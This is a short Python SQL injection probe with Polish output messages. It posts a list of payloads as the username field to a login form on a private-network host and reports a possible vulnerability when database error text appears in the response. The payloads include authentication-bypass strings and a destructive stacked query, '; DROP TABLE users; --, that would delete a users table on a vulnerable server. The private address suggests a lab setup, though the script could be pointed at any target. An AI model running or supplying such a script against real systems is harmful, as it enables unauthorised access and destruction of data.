import requests
url = "http://192.168.1.197:8080"
payloads = ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "'; DROP TABLE users; --"]
vulnerable = False
for payload in payloads:
    params = {"username": payload, "password": "test"}
    response = requests.post(url, data=params)
    if any(x in response.text.lower() for x in ["sql", "syntax", "error", "mysql", "warning"]):
        print(f"[!] Potencjalna podatność SQLi z payloadem: {payload}")
        vulnerable = True
if not vulnerable:
    print("[-] Nie wykryto podatności SQL Injection.")